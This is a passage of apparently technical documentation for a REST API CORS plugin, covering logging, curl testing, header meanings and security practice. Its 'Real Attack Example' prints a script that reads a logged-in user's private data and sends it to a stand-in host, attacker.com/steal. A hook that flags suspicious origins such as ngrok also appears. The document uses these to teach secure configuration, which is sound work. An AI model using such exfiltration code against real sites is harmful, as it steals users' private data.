  origin: 'https://app.example.com',
  method: 'POST',
  path: '/api/users'
}
2024-01-15T10:23:45.125Z [WARN] [my-api:plugin:rest-api-cors] CORS origin not allowed {
  origin: 'https://malicious-site.com',
  allowedOrigins: [ 'https://app.example.com', 'https://admin.example.com' ]
}
```

**What Each Log Means:**

1. **OPTIONS request log:**
   - Shows preflight requests as they arrive
   - Helps verify browser is sending correct preflight

2. **Processing response log:**
   - Shows CORS headers being added to regular requests
   - Confirms which origin is being processed

3. **Origin not allowed warning:**
   - Critical for security - shows blocked attempts
   - Lists what origins ARE allowed for debugging

**Debugging Specific Issues:**

```javascript
// Add custom logging for deep debugging
api.addHook('transport:response', 'cors-debug', { order: -999 }, 
  async ({ context }) => {
    const { request, response } = context.transport;
    console.log('CORS Debug:', {
      requestOrigin: request.headers.origin,
      responseHeaders: {
        'Access-Control-Allow-Origin': response.headers['Access-Control-Allow-Origin'],
        'Access-Control-Allow-Credentials': response.headers['Access-Control-Allow-Credentials']
      },
      allowed: !!response.headers['Access-Control-Allow-Origin']
    });
  }
);
```

### Testing CORS

**Understanding CORS Testing**

CORS is enforced by browsers, not servers. This creates interesting testing scenarios:
- **cURL/Postman**: Requests always work (no CORS enforcement)
- **Browser**: Requests blocked if CORS headers are wrong
- **Server**: Always sends CORS headers, doesn't block requests

**What These Tests Check:**

1. **Server sends correct headers** (not whether requests are blocked)
2. **Preflight responses** have right status codes
3. **Dynamic origin validation** works correctly

**Testing Assumptions:**
These examples assume:
- API running on `http://localhost:3000`
- Testing origin `https://example.com`
- Default CORS configuration (allows all origins)

**Example using cURL:**

```bash
# Test preflight request
curl -X OPTIONS http://localhost:3000/api/articles \
  -H "Origin: https://example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v

# Test actual request
curl -X GET http://localhost:3000/api/articles \
  -H "Origin: https://example.com" \
  -v
```

**What to Look For in Preflight Response:**
```
< HTTP/1.1 204 No Content
< Access-Control-Allow-Origin: https://example.com
< Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
< Access-Control-Allow-Headers: Content-Type, Authorization, ...
< Access-Control-Max-Age: 86400
< Access-Control-Allow-Credentials: true
< Vary: Origin
```

**What to Look For in Regular Response:**
```
< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: https://example.com
< Access-Control-Allow-Credentials: true
< Access-Control-Expose-Headers: X-Total-Count, X-Page-Count, Link
< Vary: Origin
< Content-Type: application/vnd.api+json
```

**Important Testing Notes:**

1. **cURL Always Succeeds** - Even with wrong CORS headers:
   ```bash
   # This works in cURL but fails in browser
   curl -X GET http://localhost:3000/api/articles \
     -H "Origin: https://blocked-site.com"
   ```

2. **Browser Testing is Required** for real CORS validation:
   ```javascript
   // In browser console (will fail if CORS is wrong)
   fetch('http://localhost:3000/api/articles')
     .then(r => r.json())
     .then(console.log)
     .catch(e => console.error('CORS Error:', e));
   ```

3. **Credentials Make a Difference**:
   ```bash
   # Without credentials (works with wildcard)
   curl -X OPTIONS http://localhost:3000/api/articles \
     -H "Origin: https://any-site.com" \
     -H "Access-Control-Request-Method: GET"
   
   # With credentials (needs specific origin)
   curl -X OPTIONS http://localhost:3000/api/articles \
     -H "Origin: https://any-site.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Cookie: session=abc123"
   ```

### Browser DevTools

In Chrome/Firefox DevTools:
1. Network tab → Find the request
2. Check Response Headers for CORS headers
3. For failed requests, check Console for CORS errors

### Common CORS Headers Explained

**Understanding Each CORS Header in Detail**

#### Core CORS Headers

| Header | Purpose | Example |
| `Access-Control-Allow-Origin` | **The Most Important Header** - Tells browser which origin can access the response | `https://app.example.com` or `*` |

**Deep Dive: Access-Control-Allow-Origin**
- Single origin: `Access-Control-Allow-Origin: https://app.example.com`
- Wildcard: `Access-Control-Allow-Origin: *` (not allowed with credentials)
- Dynamic: Server echoes the request's Origin if allowed
- Missing: Browser blocks the response

**Common Mistakes:**
```javascript
// WRONG - Multiple origins in header
response.headers['Access-Control-Allow-Origin'] = 'https://a.com, https://b.com';

// RIGHT - Echo the allowed origin
if (allowedOrigins.includes(request.headers.origin)) {
  response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
}
```
| `Access-Control-Allow-Credentials` | **Security Critical** - Allows browser to include cookies and auth headers | `true` |

**Deep Dive: Access-Control-Allow-Credentials**
- Only valid value is `true` (or omit header)
- Forces origin to be specific (no wildcard)
- Required for:
  - Cookie-based sessions
  - HTTP authentication
  - Client certificates

**Security Impact:**
```javascript
// DANGEROUS - Never do this
response.headers['Access-Control-Allow-Origin'] = '*';
response.headers['Access-Control-Allow-Credentials'] = 'true';
// Browsers will reject this combination

// SECURE - Specific origin with credentials
response.headers['Access-Control-Allow-Origin'] = 'https://app.example.com';
response.headers['Access-Control-Allow-Credentials'] = 'true';
```
| `Access-Control-Allow-Methods` | **Preflight Only** - Lists which HTTP methods are allowed | `GET, POST, PUT, DELETE, OPTIONS` |

**Deep Dive: Access-Control-Allow-Methods**
- Only sent in preflight responses (OPTIONS)
- Lists all methods the client can use
- Case-sensitive (use uppercase)
- Must include the requested method

**Example Scenarios:**
```javascript
// Read-only API
headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS';

// Full CRUD API
headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, PATCH, DELETE, OPTIONS';

// Custom methods
headers['Access-Control-Allow-Methods'] = 'GET, POST, PURGE, OPTIONS';
```
| `Access-Control-Allow-Headers` | **Preflight Only** - Lists headers the client can include | `Content-Type, Authorization, X-Requested-With` |

**Deep Dive: Access-Control-Allow-Headers**
- Only in preflight responses
- Must include all headers the client will send
- Some headers are always allowed ("simple headers")
- Case-insensitive

**Simple Headers (always allowed):**
- `Accept`
- `Accept-Language`
- `Content-Language`
- `Content-Type` (only for simple values)

**Headers That Need Permission:**
```javascript
// API using various auth methods
headers['Access-Control-Allow-Headers'] = [
  'Authorization',      // Bearer tokens
  'X-API-Key',         // API keys
  'X-CSRF-Token',      // CSRF protection
  'Content-Type',      // For JSON payloads
  'X-Requested-With'   // AJAX detection
].join(', ');
```
| `Access-Control-Expose-Headers` | **Response Only** - Makes custom headers readable to JavaScript | `X-Total-Count, X-RateLimit-Remaining` |

**Deep Dive: Access-Control-Expose-Headers**
- By default, JS can only read "simple response headers"
- This header exposes additional headers
- Only affects what JavaScript can read
- The network tab shows all headers regardless

**Default Readable Headers:**
- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

**Common Custom Headers to Expose:**
```javascript
headers['Access-Control-Expose-Headers'] = [
  // Pagination
  'X-Total-Count',
  'X-Page-Count',
  'Link',
  
  // Rate Limiting
  'X-RateLimit-Limit',
  'X-RateLimit-Remaining',
  'X-RateLimit-Reset',
  
  // API Info
  'X-API-Version',
  'X-Response-Time',
  'X-Request-ID'
].join(', ');
```
| `Access-Control-Max-Age` | **Performance** - How long browser can cache preflight | `86400` (24 hours) |

**Deep Dive: Access-Control-Max-Age**
- Reduces preflight requests
- Value in seconds
- Browser maximum varies (Chrome: 2 hours, Firefox: 24 hours)
- Set lower during development

**Optimization Strategies:**
```javascript
// Development - quick changes
headers['Access-Control-Max-Age'] = '60'; // 1 minute

// Staging - moderate caching
headers['Access-Control-Max-Age'] = '3600'; // 1 hour

// Production - maximum caching
headers['Access-Control-Max-Age'] = '86400'; // 24 hours
```
| `Vary` | **Caching Hint** - Tells proxies/CDNs response varies by Origin | `Origin` |

**Deep Dive: Vary Header**
- Critical for CDNs and proxies
- Prevents wrong CORS headers being cached
- Should always include `Origin` when CORS headers vary

**Why It Matters:**
```javascript
// Without Vary: Origin
// 1. CDN caches response for https://a.com
// 2. Request from https://b.com gets cached response
// 3. Browser sees wrong Access-Control-Allow-Origin

// With Vary: Origin
// CDN caches separate responses per origin
response.headers['Vary'] = 'Origin';
```

#### Additional CORS Headers

| Header | Purpose | When Used |
|--------|---------|--------|
| `Access-Control-Request-Method` | **Request** - Asks permission for HTTP method | Preflight requests |
| `Access-Control-Request-Headers` | **Request** - Asks permission for headers | Preflight requests |
| `Origin` | **Request** - Identifies requesting origin | All CORS requests |

**Preflight Request Flow:**
```
Browser → Server:
  OPTIONS /api/users
  Origin: https://app.example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, X-API-Key

Server → Browser:
  204 No Content
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
  Access-Control-Allow-Headers: Content-Type, X-API-Key
  Access-Control-Max-Age: 86400
```

## Security Considerations

CORS is a security feature, but misconfiguration can create vulnerabilities. Here's what you need to know:

### 1. Never Use Wildcard with Credentials

**The Rule:** When `credentials: true`, you MUST specify exact origins, never use `*`.

**Why This Matters:**
```javascript
// VULNERABLE - This configuration is dangerous
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true  // Browser will reject this!
  }
});
```

**What Could Happen:**
If browsers allowed this:
1. Evil site `https://attacker.com` loads in user's browser
2. User is logged into your API (has auth cookie)
3. Evil site makes request to your API
4. Browser would send user's cookies
5. Attacker gets user's private data

**The Safe Way:**
```javascript
// SECURE - Explicit origins only
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.mycompany.com', 'https://admin.mycompany.com'],
    credentials: true
  }
});
```

**Real Attack Example:**
```html
<!-- On attacker.com -->
<script>
// If wildcard+credentials worked, this would steal user data
fetch('https://api.yourcompany.com/user/private-data', {
  credentials: 'include'  // Would send victim's cookies
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```
### 2. Validate Origins Against a Whitelist

**The Rule:** Never trust user input. Always validate origins against known good values.

**Why This Matters:**
The `Origin` header comes from the browser, but:
- Can be spoofed in non-browser requests
- Might contain unexpected values
- Could be used for reconnaissance

**Bad Example - Dangerous Pattern:**
```javascript
// NEVER DO THIS - Accepts any origin
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      return true; // Accepts everything!
    }
  }
});

// ALSO BAD - Weak validation
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      return origin.includes('mycompany'); // subdomain.mycompany.evil.com would pass!
    }
  }
});
```

**Good Example - Secure Validation:**
```javascript
// SECURE - Whitelist approach
const allowedOrigins = new Set([
  'https://app.mycompany.com',
  'https://admin.mycompany.com',
  'https://staging.mycompany.com'
]);

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Strict whitelist check
      if (allowedOrigins.has(origin)) {
        return true;
      }
      
      // Log rejected attempts
      console.warn('CORS: Rejected origin:', origin);
      return false;
    }
  }
});

// SECURE - Database-driven whitelist
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: async (origin) => {
      const allowed = await db('allowed_origins')
        .where({ origin, active: true })
        .first();
      
      if (!allowed) {
        // Security event logging
        await db('security_events').insert({
          type: 'cors_rejection',
          origin,
          timestamp: new Date(),
          ip: requestIp // If available
        });
      }
      
      return !!allowed;
    }
  }
});
```

**Advanced Pattern Recognition:**
```javascript
// Be careful with patterns
const secureOriginValidator = (origin) => {
  // Prevent subdomain takeover attacks
  const parsed = new URL(origin);
  
  // Must be HTTPS
  if (parsed.protocol !== 'https:') return false;
  
  // Check against allowed patterns
  const allowedPatterns = [
    /^https:\/\/[a-z0-9-]+\.mycompany\.com$/,  // Subdomains
    /^https:\/\/localhost:\d+$/  // Local dev only
  ];
  
  return allowedPatterns.some(pattern => pattern.test(origin));
};
```
### 3. Limit Exposed Headers

**The Rule:** Only expose headers that client applications actually need to read.

**Why This Matters:**
Exposed headers can leak information:
- Internal system details
- User information
- Infrastructure details
- Security tokens

**Bad Example - Over-Exposure:**
```javascript
// TOO MUCH INFORMATION
await api.use(CorsPlugin, {
  'rest-api-cors': {
    exposedHeaders: [
      'X-Powered-By',           // Reveals server technology
      'X-Server-Instance',      // Infrastructure details
      'X-Internal-Request-ID',  // Internal tracking
      'X-Database-Query-Time',  // Performance details
      'X-User-Internal-ID',     // Internal user IDs
      'X-Debug-Info'            // Debug information
    ]
  }
});
```

**Good Example - Minimal Exposure:**
```javascript
// SECURE - Only what's needed
await api.use(CorsPlugin, {
  'rest-api-cors': {
    exposedHeaders: [
      // Pagination - needed for UI
      'X-Total-Count',
      'Link',
      
      // Rate limiting - needed for client backoff
      'X-RateLimit-Remaining',
      'X-RateLimit-Reset'
      
      // Nothing else!
    ]
  }
});
```

**Security Headers to Never Expose:**
```javascript
// NEVER expose these headers
const dangerousHeaders = [
  'X-Internal-User-Role',     // Internal permissions
  'X-Session-Token',          // Session identifiers
  'X-Database-Connection',    // Infrastructure
  'X-Internal-Error-Details', // Stack traces
  'X-Employee-ID',            // Internal IDs
  'X-AWS-Request-ID'          // Cloud provider details
];
```

**Dynamic Header Exposure:**
```javascript
// Expose different headers based on user role
api.addHook('transport:response', 'dynamic-expose', async ({ context, response }) => {
  const userRole = context.user?.role;
  
  if (userRole === 'developer') {
    // Developers get debug headers
    response.headers['Access-Control-Expose-Headers'] += ', X-Query-Time, X-Cache-Status';
  } else {
    // Regular users get minimal headers
    response.headers['Access-Control-Expose-Headers'] = 'X-Total-Count';
  }
});
```
### 4. Always Use HTTPS in Production

**The Rule:** CORS is not a replacement for HTTPS. Always use HTTPS in production.

**Why This Matters:**
CORS only controls which websites can access your API from a browser. It doesn't:
- Encrypt data in transit
- Prevent man-in-the-middle attacks
- Authenticate the server
- Protect against network sniffing

**What CORS Does vs What HTTPS Does:**

| Security Aspect | CORS | HTTPS |
|----------------|------|-------|
| Prevents malicious websites | ✅ | ❌ |
| Encrypts data in transit | ❌ | ✅ |
| Authenticates server identity | ❌ | ✅ |
| Prevents MITM attacks | ❌ | ✅ |
| Protects cookies | Partial | ✅ |

**Production Configuration:**
```javascript
// SECURE - HTTPS only in production
if (process.env.NODE_ENV === 'production') {
  // Enforce HTTPS origins only
  await api.use(CorsPlugin, {
    'rest-api-cors': {
      origin: (origin) => {
        if (!origin.startsWith('https://')) {
          console.warn('Rejected non-HTTPS origin:', origin);
          return false;
        }
        return allowedOrigins.includes(origin);
      }
    }
  });
  
  // Also enforce secure cookies
  app.use(session({
    cookie: {
      secure: true,      // HTTPS only
      httpOnly: true,    // No JS access
      sameSite: 'strict' // CSRF protection
    }
  }));
}
```

**Common HTTPS + CORS Issues:**
```javascript
// Mixed content problems
// If API is HTTPS but allows HTTP origins:
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: [
      'https://app.example.com',  // Good
      'http://app.example.com'    // Bad - browser may block
    ]
  }
});

// Solution: Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});
```
### 5. Regular Security Audits

**The Rule:** Periodically review and audit your CORS configuration to remove unused origins and tighten security.

**Why This Matters:**
- Old partner domains might be compromised
- Development/staging URLs might leak to production
- Subdomain takeover attacks
- Accumulated technical debt

**Audit Checklist:**

```javascript
// 1. Log and monitor origin usage
const originStats = new Map();

api.addHook('transport:request', 'origin-monitor', async ({ request }) => {
  const origin = request.headers.origin;
  if (origin) {
    const stats = originStats.get(origin) || { count: 0, lastSeen: null };
    stats.count++;
    stats.lastSeen = new Date();
    originStats.set(origin, stats);
  }
});

// 2. Regular audit function
async function auditCorsOrigins(corsConfig) {
  console.log('=== CORS Origin Audit ===');
  
  // Check configured origins
  console.log('Configured origins:', corsConfig.origin);
  
  // Show usage stats
  console.log('\nOrigin Usage (last 30 days):');
  for (const [origin, stats] of originStats) {
    console.log(`${origin}: ${stats.count} requests, last: ${stats.lastSeen}`);
  }
  
  // Check for unused origins
  const unusedDays = 30;
  const cutoff = new Date(Date.now() - unusedDays * 24 * 60 * 60 * 1000);
  
  console.log('\nPotentially unused origins:');
  for (const [origin, stats] of originStats) {
    if (stats.lastSeen < cutoff) {
      console.log(`${origin} - Last used: ${stats.lastSeen}`);
    }
  }
}

// 3. Run monthly
setInterval(auditCorsOrigins, 30 * 24 * 60 * 60 * 1000);
```

**Automated Security Checks:**
```javascript
// Check for subdomain takeover risks
async function checkSubdomainTakeover(corsConfig) {
  const origins = Array.isArray(corsConfig.origin) ? corsConfig.origin : [corsConfig.origin];
  
  for (const origin of origins) {
    try {
      const url = new URL(origin);
      const response = await fetch(url.origin);
      
      // Check if domain still points to your infrastructure
      if (!response.ok || !response.headers.get('x-your-app')) {
        console.error(`SECURITY RISK: ${origin} may be compromised`);
        // Send alert to security team
      }
    } catch (error) {
      console.error(`Cannot verify ${origin}: ${error.message}`);
    }
  }
}
```

**Origin Management Best Practices:**
```javascript
// Track allowed origins in your configuration
const corsOrigins = {
  production: [
    'https://app.example.com',
    'https://admin.example.com'
  ],
  staging: [
    'https://staging.example.com',
    'https://preview.example.com'
  ],
  development: '*'
};

// Use environment-based configuration
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: corsOrigins[process.env.NODE_ENV] || corsOrigins.development
  }
});

// To add or remove origins, update the configuration and restart the server
// This ensures all server instances have consistent CORS settings
```

**Security Alerts:**
```javascript
// Alert on suspicious patterns
api.addHook('transport:request', 'security-alert', async ({ request }) => {
  const origin = request.headers.origin;
  
  // Check for suspicious patterns
  if (origin && (
    origin.includes('ngrok.io') ||
    origin.includes('localhost.run') ||
    origin.includes('.local') ||
    origin.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
  )) {
    console.warn('SECURITY ALERT: Suspicious origin detected:', origin);
    // Send to security monitoring
  }
});
```
